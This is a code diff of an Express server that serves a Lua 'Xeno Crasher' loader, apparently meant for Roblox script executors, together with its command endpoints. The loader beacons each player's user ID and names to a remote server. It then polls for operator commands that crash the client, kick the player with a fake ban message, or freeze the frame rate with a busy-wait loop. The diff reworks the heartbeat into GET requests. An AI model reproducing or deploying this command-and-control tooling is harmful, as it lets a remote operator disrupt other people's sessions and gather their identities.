@@ -17,36 +17,28 @@ app.use(express.json({ limit: '10mb' }));
 const players = new Map();
 
 // ============================================
-// LOADER SCRIPT - WITH STARTUP DELAY
+// LOADER SCRIPT
 // ============================================
 app.get('/loader.lua', (req, res) => {
-    const loader = `--[[ Xeno Crasher - NO AUTO-CRASH ]]--
+    // Serve the script above (or use the one from your site)
+    const loader = `--[[ Xeno Crasher - UNIVERSAL ]]--
 local BASE = "${PUBLIC_URL}"
 local KEY  = "xenooooo"
 
--- ============================================
--- HTTP (GET & POST)
--- ============================================
 local HttpService = game:GetService("HttpService")
 HttpService.HttpEnabled = true
 
-local function sendRequest(method, url, data)
-    local requestOptions = {
-        Url = url,
-        Method = method,
-        Headers = {
-            ["Content-Type"] = "application/json",
-            ["X-Api-Key"] = KEY
-        }
-    }
-    if method == "POST" and data then
-        requestOptions.Body = data
-    end
-    
+local function sendGet(url)
     local success, result = pcall(function()
-        return HttpService:RequestAsync(requestOptions)
+        return HttpService:RequestAsync({
+            Url = url,
+            Method = "GET",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["X-Api-Key"] = KEY
+            }
+        })
     end)
-    
     if success and result and result.Body then
         return result.Body
     else
@@ -64,15 +56,6 @@ if not LP then
 end
 if not LP then return end
 
-local function safe(fn)
-    local ok, res = pcall(fn)
-    if ok then return res end
-    return nil
-end
-
--- ============================================
--- GUI
--- ============================================
 local function createGUI()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "XenoCrasherGUI"
@@ -112,19 +95,13 @@ end
 
 local gui, statusLabel = createGUI()
 
--- ============================================
--- HEARTBEAT (POST)
--- ============================================
 local function heartbeat()
-    local data = HttpService:JSONEncode({
-        user_id = LP.UserId,
-        username = LP.Name,
-        display_name = LP.DisplayName,
-        executor = "XenoClient",
-        online = true
-    })
+    local url = BASE .. "/api/public/heartbeat?user_id=" .. LP.UserId 
+        .. "&username=" .. HttpService:UrlEncode(LP.Name)
+        .. "&display_name=" .. HttpService:UrlEncode(LP.DisplayName)
+        .. "&executor=XenoClient&online=true"
     
-    local result = sendRequest("POST", BASE .. "/api/public/heartbeat", data)
+    local result = sendGet(url)
     if result then
         statusLabel.Text = "🟢 Connected"
     else
@@ -132,9 +109,6 @@ local function heartbeat()
     end
 end
 
--- ============================================
--- FPS LIMIT
--- ============================================
 local fpsConnection = nil
 local fpsActive = false
 
@@ -144,43 +118,33 @@ local function setFPSLimit(targetFPS)
         fpsConnection = nil
         fpsActive = false
     end
-    
     if not targetFPS or targetFPS <= 0 then
         statusLabel.Text = "🟢 FPS off"
         return
     end
-    
     fpsActive = true
     local frameTime = 1 / targetFPS
     statusLabel.Text = "🎯 FPS: " .. targetFPS
-    
     fpsConnection = RunService.RenderStepped:Connect(function()
         local startTime = tick()
         while tick() - startTime < frameTime and fpsActive do end
     end)
 end
 
--- ============================================
--- POLL - WITH SAFETY DELAY (no auto-crash)
--- ============================================
 local pollRunning = false
 local function poll()
     if pollRunning then return end
     pollRunning = true
-    
     local url = BASE .. "/api/public/command?user_id=" .. LP.UserId
-    local result = sendRequest("GET", url, nil)
-    
+    local result = sendGet(url)
     if result and result ~= "" then
         local data = HttpService:JSONDecode(result)
         print("📥 Received: " .. HttpService:JSONEncode(data))
-        
         if data.fps_limit then
             setFPSLimit(tonumber(data.fps_limit))
         else
             setFPSLimit(nil)
         end
-        
         if data.crash == true then
             print("💥 CRASH!")
             statusLabel.Text = "💥 CRASHING!"
@@ -198,56 +162,70 @@ local function poll()
                 end
             end)
         end
-        
         if data.kick == true then
             print("👢 KICK!")
             task.wait(0.5)
             LP:Kick("You have been banned.")
         end
     end
-    
     pollRunning = false
 end
 
--- ============================================
--- START - WITH 3 SECOND DELAY BEFORE POLLING
--- ============================================
 print("🚀 Starting Xeno Crasher...")
-
--- Send initial heartbeat
 heartbeat()
-
--- Wait 3 seconds before starting polling to avoid stale commands
 task.wait(3)
-
--- Start polling loop
 task.spawn(function()
     while true do
         poll()
         task.wait(0.5)
     end
 end)
-
--- Heartbeat loop
 task.spawn(function()
     while true do
         heartbeat()
         task.wait(5)
     end
 end)
-
 print("✅ Xeno Crasher loaded!")
-print("👤 Player: " .. LP.Name)
-print("🔗 Connected to: " .. BASE)
-`;
+print("👤 Player: " .. LP.Name)`;
 
     res.setHeader('Content-Type', 'text/plain');
     res.send(loader);
 });
 
 // ============================================
-// API ENDPOINTS
+// ✅ NEW: GET endpoint for heartbeat
 // ============================================
+app.get('/api/public/heartbeat', (req, res) => {
+    const { user_id, username, display_name, executor, online } = req.query;
+    if (!user_id) {
+        return res.status(400).json({ error: 'Missing user_id' });
+    }
+    const userId = String(user_id);
+    
+    const existing = players.get(userId) || {};
+    const data = {
+        user_id: userId,
+        username: username || existing.username || 'Unknown',
+        display_name: display_name || existing.display_name || '',
+        executor: executor || existing.executor || 'Unknown',
+        online: online === 'true'
+    };
+    
+    players.set(userId, {
+        ...existing,
+        ...data,
+        user_id: userId,
+        online: true,
+        lastHeartbeat: Date.now(),
+        _crash: false,
+        _kick: false,
+        fps_limit: false
+    });
+    
+    console.log(`❤️ Heartbeat (GET) from: ${data.username || userId}`);
+    res.json({ status: 'ok' });
+});
 
 app.post('/api/public/heartbeat', (req, res) => {
     const data = req.body;
@@ -257,22 +235,18 @@ app.post('/api/public/heartbeat', (req, res) => {
     const userId = String(data.user_id);
     
     const existing = players.get(userId) || {};
-    
-    // ✅ CLEAR any pending crash/kick flags on new heartbeat
-    const cleared = {
+    players.set(userId, {
         ...existing,
         ...data,
         user_id: userId,
         online: true,
         lastHeartbeat: Date.now(),
-        _crash: false,   // <- clear crash flag
-        _kick: false,    // <- clear kick flag
-        fps_limit: false // optionally clear FPS
-    };
+        _crash: false,
+        _kick: false,
+        fps_limit: false
+    });
     
-    players.set(userId, cleared);
-    
-    console.log(`❤️ Heartbeat from: ${data.username || userId} (flags cleared)`);
+    console.log(`❤️ Heartbeat (POST) from: ${data.username || userId}`);
     res.json({ status: 'ok' });
 });
 
@@ -284,12 +258,10 @@ app.get('/api/players', (req, res) => {
     for (const [id, p] of players.entries()) {
         const timeSinceLast = now - (p.lastHeartbeat || 0);
         const online = timeSinceLast < OFFLINE_THRESHOLD;
-        
         p.online = online;
         list.push({ ...p });
         players.set(id, p);
     }
-    
     res.json({ players: list });
 });
 
@@ -324,7 +296,6 @@ app.get('/api/public/command', (req, res) => {
     if (!p) return res.json({});
     
     const response = {};
-    
     if (p.fps_limit) {
         response.fps_limit = p.fps_limit;
         p.fps_limit = false;
@@ -337,7 +308,6 @@ app.get('/api/public/command', (req, res) => {
         response.kick = true;
         p._kick = false;
     }
-    
     players.set(String(userId), p);
     res.json(response);
 });
